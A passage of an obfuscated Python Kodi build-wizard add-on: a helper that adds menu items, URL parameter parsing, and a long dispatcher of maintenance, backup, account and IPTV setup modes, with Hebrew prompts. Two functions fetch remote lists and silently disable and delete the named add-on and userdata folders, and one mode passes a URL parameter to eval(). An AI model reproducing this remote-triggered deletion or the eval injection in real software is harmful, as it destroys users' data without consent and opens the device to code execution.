	OOO000OO00O0OOO00 =sys .argv [0 ]#line:6170
	if not mode ==None :OOO000OO00O0OOO00 +="?mode=%s"%urllib .quote_plus (mode )#line:6171
	if not name ==None :OOO000OO00O0OOO00 +="&name="+urllib .quote_plus (name )#line:6172
	if not url ==None :OOO000OO00O0OOO00 +="&url="+urllib .quote_plus (url )#line:6173
	OO0OO0OO000000O00 =True #line:6174
	if themeit :OO00000O0OOOO00OO =themeit %OO00000O0OOOO00OO #line:6175
	O0OO0O0OOOO00O0OO =xbmcgui .ListItem (OO00000O0OOOO00OO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6176
	O0OO0O0OOOO00O0OO .setInfo (type ="Video",infoLabels ={"Title":OO00000O0OOOO00OO ,"Plot":description })#line:6177
	O0OO0O0OOOO00O0OO .setProperty ("Fanart_Image",fanart )#line:6178
	if not menu ==None :O0OO0O0OOOO00O0OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:6179
	OO0OO0OO000000O00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO000OO00O0OOO00 ,listitem =O0OO0O0OOOO00O0OO ,isFolder =False )#line:6180
	return OO0OO0OO000000O00 #line:6181
def get_params ():#line:6183
	OOOO0O000000O000O =[]#line:6184
	OOO0O0OOOO00OO0OO =sys .argv [2 ]#line:6185
	if len (OOO0O0OOOO00OO0OO )>=2 :#line:6186
		O00OOO000000OO00O =sys .argv [2 ]#line:6187
		O0OO0O000OO00OOO0 =O00OOO000000OO00O .replace ('?','')#line:6188
		if (O00OOO000000OO00O [len (O00OOO000000OO00O )-1 ]=='/'):#line:6189
			O00OOO000000OO00O =O00OOO000000OO00O [0 :len (O00OOO000000OO00O )-2 ]#line:6190
		O0OOOOO0O0O0O0OOO =O0OO0O000OO00OOO0 .split ('&')#line:6191
		OOOO0O000000O000O ={}#line:6192
		for O0OO0O00O0O00OOOO in range (len (O0OOOOO0O0O0O0OOO )):#line:6193
			OO0O0OOOO0OOO0OO0 ={}#line:6194
			OO0O0OOOO0OOO0OO0 =O0OOOOO0O0O0O0OOO [O0OO0O00O0O00OOOO ].split ('=')#line:6195
			if (len (OO0O0OOOO0OOO0OO0 ))==2 :#line:6196
				OOOO0O000000O000O [OO0O0OOOO0OOO0OO0 [0 ]]=OO0O0OOOO0OOO0OO0 [1 ]#line:6197
		return OOOO0O000000O000O #line:6199
def remove_addons ():#line:6201
	try :#line:6202
			import json #line:6203
			O0O0OO00OOOOO00O0 =urllib2 .urlopen (remove_url ).readlines ()#line:6204
			for OO0O00O0O0OOO0OO0 in O0O0OO00OOOOO00O0 :#line:6205
				O00OO0O00000O00OO =OO0O00O0O0OOO0OO0 .split (':')[1 ].strip ()#line:6207
				OO0OO0000OO00OOO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O00OO0O00000O00OO ,'false')#line:6208
				O0O0OOO00OO0O00O0 =xbmc .executeJSONRPC (OO0OO0000OO00OOO0 )#line:6209
				O000OOO000O000O00 =json .loads (O0O0OOO00OO0O00O0 )#line:6210
				O00O000000OO0OO00 =os .path .join (addons_folder ,O00OO0O00000O00OO )#line:6212
				if os .path .exists (O00O000000OO0OO00 ):#line:6214
					for OOOO0O000OO0OOOO0 ,O0OO0O0000O00OOOO ,O0OOO0O0O00OOO0OO in os .walk (O00O000000OO0OO00 ):#line:6215
						for O0OO000000000O000 in O0OOO0O0O00OOO0OO :#line:6216
							os .unlink (os .path .join (OOOO0O000OO0OOOO0 ,O0OO000000000O000 ))#line:6217
						for OOOOO00O0O00O0000 in O0OO0O0000O00OOOO :#line:6218
							shutil .rmtree (os .path .join (OOOO0O000OO0OOOO0 ,OOOOO00O0O00O0000 ))#line:6219
					os .rmdir (O00O000000OO0OO00 )#line:6220
			xbmc .executebuiltin ('Container.Refresh')#line:6222
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:6223
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:6224
	except :pass #line:6225
def remove_addons2 ():#line:6226
	try :#line:6227
			import json #line:6228
			OOO0O000O000OO0O0 =urllib2 .urlopen (remove_url2 ).readlines ()#line:6229
			for OO0OOO0OO0OO00OO0 in OOO0O000O000OO0O0 :#line:6230
				O000O0O000O00O0OO =OO0OOO0OO0OO00OO0 .split (':')[1 ].strip ()#line:6232
				O0O0O0000O0O0OOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O000O0O000O00O0OO ,'false')#line:6233
				OO0OOO00OOO0O00OO =xbmc .executeJSONRPC (O0O0O0000O0O0OOOO )#line:6234
				OOO00OO000O0O0OOO =json .loads (OO0OOO00OOO0O00OO )#line:6235
				OO0OOO0O0000O0OOO =os .path .join (user_folder ,O000O0O000O00O0OO )#line:6237
				if os .path .exists (OO0OOO0O0000O0OOO ):#line:6239
					for O00OOOOO0OO0O0000 ,O0OOOOOO0OOOOO0O0 ,OO000O00O0O0O0O0O in os .walk (OO0OOO0O0000O0OOO ):#line:6240
						for OO00000O0OOOOOOOO in OO000O00O0O0O0O0O :#line:6241
							os .unlink (os .path .join (O00OOOOO0OO0O0000 ,OO00000O0OOOOOOOO ))#line:6242
						for O0O00000O0O0O0OO0 in O0OOOOOO0OOOOO0O0 :#line:6243
							shutil .rmtree (os .path .join (O00OOOOO0OO0O0000 ,O0O00000O0O0O0OO0 ))#line:6244
					os .rmdir (OO0OOO0O0000O0OOO )#line:6245
	except :pass #line:6247
params =get_params ()#line:6248
url =None #line:6249
name =None #line:6250
mode =None #line:6251
try :mode =urllib .unquote_plus (params ["mode"])#line:6253
except :pass #line:6254
try :name =urllib .unquote_plus (params ["name"])#line:6255
except :pass #line:6256
try :url =urllib .unquote_plus (params ["url"])#line:6257
except :pass #line:6258
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:6260
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:6261
def setView (OOOO00000O000O00O ,O0O0O0O0OO0000OO0 ):#line:6262
	if wiz .getS ('auto-view')=='true':#line:6263
		O0O00000000OOO0O0 =wiz .getS (O0O0O0O0OO0000OO0 )#line:6264
		if O0O00000000OOO0O0 =='50'and KODIV >=17 and SKIN =='skin.estuary':O0O00000000OOO0O0 ='55'#line:6265
		if O0O00000000OOO0O0 =='500'and KODIV >=17 and SKIN =='skin.estuary':O0O00000000OOO0O0 ='50'#line:6266
		wiz .ebi ("Container.SetViewMode(%s)"%O0O00000000OOO0O0 )#line:6267
if mode ==None :index ()#line:6269
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:6271
elif mode =='builds':buildMenu ()#line:6272
elif mode =='viewbuild':viewBuild (name )#line:6273
elif mode =='buildinfo':buildInfo (name )#line:6274
elif mode =='buildpreview':buildVideo (name )#line:6275
elif mode =='install':buildWizard (name ,url )#line:6276
elif mode =='theme':buildWizard (name ,mode ,url )#line:6277
elif mode =='viewthirdparty':viewThirdList (name )#line:6278
elif mode =='installthird':thirdPartyInstall (name ,url )#line:6279
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:6280
elif mode =='maint':maintMenu (name )#line:6282
elif mode =='passpin':passandpin ()#line:6283
elif mode =='backmyupbuild':backmyupbuild ()#line:6284
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:6285
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:6286
elif mode =='advancedsetting':advancedWindow (name )#line:6287
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:6288
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:6289
elif mode =='asciicheck':wiz .asciiCheck ()#line:6290
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:6291
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:6292
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:6293
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:6294
elif mode =='oldThumbs':wiz .oldThumbs ()#line:6295
elif mode =='clearbackup':wiz .cleanupBackup ()#line:6296
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:6297
elif mode =='currentsettings':viewAdvanced ()#line:6298
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:6299
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:6300
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:6301
elif mode =='fixskin':backtokodi ()#line:6302
elif mode =='testcommand':testcommand ()#line:6303
elif mode =='logsend':logsend ()#line:6304
elif mode =='rdon':rdon ()#line:6305
elif mode =='rdoff':rdoff ()#line:6306
elif mode =='setrd':setrealdebrid ()#line:6307
elif mode =='setrd2':setautorealdebrid ()#line:6308
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:6309
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:6310
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:6311
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:6312
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:6313
elif mode =='freshstart':freshStart ()#line:6314
elif mode =='forceupdate':wiz .forceUpdate ()#line:6315
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:6316
elif mode =='forceclose':wiz .killxbmc ()#line:6317
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:6318
elif mode =='hidepassword':wiz .hidePassword ()#line:6319
elif mode =='unhidepassword':wiz .unhidePassword ()#line:6320
elif mode =='enableaddons':enableAddons ()#line:6321
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:6322
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:6323
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:6324
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:6325
elif mode =='uploadlog':uploadLog .Main ()#line:6326
elif mode =='viewlog':LogViewer ()#line:6327
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:6328
elif mode =='viewerrorlog':errorChecking (all =True )#line:6329
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:6330
elif mode =='purgedb':purgeDb ()#line:6331
elif mode =='fixaddonupdate':fixUpdate ()#line:6332
elif mode =='removeaddons':removeAddonMenu ()#line:6333
elif mode =='removeaddon':removeAddon (name )#line:6334
elif mode =='removeaddondata':removeAddonDataMenu ()#line:6335
elif mode =='removedata':removeAddonData (name )#line:6336
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:6337
elif mode =='systeminfo':systemInfo ()#line:6338
elif mode =='restorezip':restoreit ('build')#line:6339
elif mode =='restoregui':restoreit ('gui')#line:6340
elif mode =='restoreaddon':restoreit ('addondata')#line:6341
elif mode =='restoreextzip':restoreextit ('build')#line:6342
elif mode =='restoreextgui':restoreextit ('gui')#line:6343
elif mode =='restoreextaddon':restoreextit ('addondata')#line:6344
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:6345
elif mode =='traktsync':traktsync ()#line:6346
elif mode =='apk':apkMenu (name )#line:6348
elif mode =='apkscrape':apkScraper (name )#line:6349
elif mode =='apkinstall':apkInstaller (name ,url )#line:6350
elif mode =='speed':speedMenu ()#line:6351
elif mode =='net':net_tools ()#line:6352
elif mode =='GetList':GetList (url )#line:6353
elif mode =='youtube':youtubeMenu (name )#line:6354
elif mode =='viewVideo':playVideo (url )#line:6355
elif mode =='addons':addonMenu (name )#line:6357
elif mode =='addoninstall':addonInstaller (name ,url )#line:6358
elif mode =='savedata':saveMenu ()#line:6360
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:6361
elif mode =='managedata':manageSaveData (name )#line:6362
elif mode =='whitelist':wiz .whiteList (name )#line:6363
elif mode =='trakt':traktMenu ()#line:6365
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:6366
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:6367
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:6368
elif mode =='cleartrakt':traktit .clearSaved (name )#line:6369
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:6370
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:6371
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:6372
elif mode =='realdebrid':realMenu ()#line:6374
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:6375
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:6376
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:6377
elif mode =='cleardebrid':debridit .clearSaved (name )#line:6378
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:6379
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:6380
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:6381
elif mode =='login':loginMenu ()#line:6383
elif mode =='savelogin':loginit .loginIt ('update',name )#line:6384
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:6385
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:6386
elif mode =='clearlogin':loginit .clearSaved (name )#line:6387
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:6388
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:6389
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:6390
elif mode =='contact':notify .contact (CONTACT )#line:6392
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:6393
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:6394
elif mode =='developer':developer ()#line:6396
elif mode =='converttext':wiz .convertText ()#line:6397
elif mode =='createqr':wiz .createQR ()#line:6398
elif mode =='testnotify':testnotify ()#line:6399
elif mode =='testnotify2':testnotify2 ()#line:6400
elif mode =='servicemanual':servicemanual ()#line:6401
elif mode =='fastinstall':fastinstall ()#line:6402
elif mode =='testupdate':testupdate ()#line:6403
elif mode =='testfirst':testfirst ()#line:6404
elif mode =='testfirstrun':testfirstRun ()#line:6405
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:6406
elif mode =='bg':wiz .bg_install (name ,url )#line:6408
elif mode =='bgcustom':wiz .bg_custom ()#line:6409
elif mode =='bgremove':wiz .bg_remove ()#line:6410
elif mode =='bgdefault':wiz .bg_default ()#line:6411
elif mode =='rdset':rdsetup ()#line:6412
elif mode =='mor':morsetup ()#line:6413
elif mode =='mor2':morsetup2 ()#line:6414
elif mode =='resolveurl':resolveurlsetup ()#line:6415
elif mode =='urlresolver':urlresolversetup ()#line:6416
elif mode =='forcefastupdate':forcefastupdate ()#line:6417
elif mode =='traktset':traktsetup ()#line:6418
elif mode =='placentaset':placentasetup ()#line:6419
elif mode =='flixnetset':flixnetsetup ()#line:6420
elif mode =='reptiliaset':reptiliasetup ()#line:6421
elif mode =='yodasset':yodasetup ()#line:6422
elif mode =='numbersset':numberssetup ()#line:6423
elif mode =='uranusset':uranussetup ()#line:6424
elif mode =='genesisset':genesissetup ()#line:6425
elif mode =='fastupdate':fastupdate ()#line:6426
elif mode =='folderback':folderback ()#line:6427
elif mode =='menudata':Menu ()#line:6428
elif mode =='infoupdate':infobuild ()#line:6429
elif mode =='wait':wait ()#line:6430
elif mode ==2 :#line:6431
        wiz .torent_menu ()#line:6432
elif mode ==3 :#line:6433
        wiz .popcorn_menu ()#line:6434
elif mode ==8 :#line:6435
        wiz .metaliq_fix ()#line:6436
elif mode ==9 :#line:6437
        wiz .quasar_menu ()#line:6438
elif mode ==5 :#line:6439
        swapSkins ('skin.Premium.mod')#line:6440
elif mode ==13 :#line:6441
        wiz .elementum_menu ()#line:6442
elif mode ==16 :#line:6443
        wiz .fix_wizard ()#line:6444
elif mode ==17 :#line:6445
        wiz .last_play ()#line:6446
elif mode ==18 :#line:6447
        wiz .normal_metalliq ()#line:6448
elif mode ==19 :#line:6449
        wiz .fast_metalliq ()#line:6450
elif mode ==20 :#line:6451
        wiz .fix_buffer2 ()#line:6452
elif mode ==21 :#line:6453
        wiz .fix_buffer3 ()#line:6454
elif mode ==11 :#line:6455
        wiz .fix_buffer ()#line:6456
elif mode ==15 :#line:6457
        wiz .fix_font ()#line:6458
elif mode ==14 :#line:6459
        wiz .clean_pass ()#line:6460
elif mode ==22 :#line:6461
        wiz .movie_update ()#line:6462
elif mode =='simpleiptv':#line:6465
    DIALOG =xbmcgui .Dialog ()#line:6467
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6468
    if choice ==1 :#line:6469
        iptvkodi17_18 ()#line:6470
    else :#line:6472
     sys .exit ()#line:6473
elif mode =='simpleidanplus':#line:6475
    DIALOG =xbmcgui .Dialog ()#line:6476
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6477
    if choice ==1 :#line:6478
        iptvidanplus ()#line:6479
    else :#line:6481
     sys .exit ()#line:6482
elif mode =='update_tele':updatetelemedia (NOTEID )#line:6484
elif mode =='adv_settings':buffer1 ()#line:6485
elif mode =='getpass':getpass ()#line:6486
elif mode =='setpass':setpass ()#line:6487
elif mode =='setuname':setuname ()#line:6488
elif mode =='passandUsername':passandUsername ()#line:6489
elif mode =='9':disply_hwr ()#line:6490
elif mode =='99':disply_hwr2 ()#line:6491
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))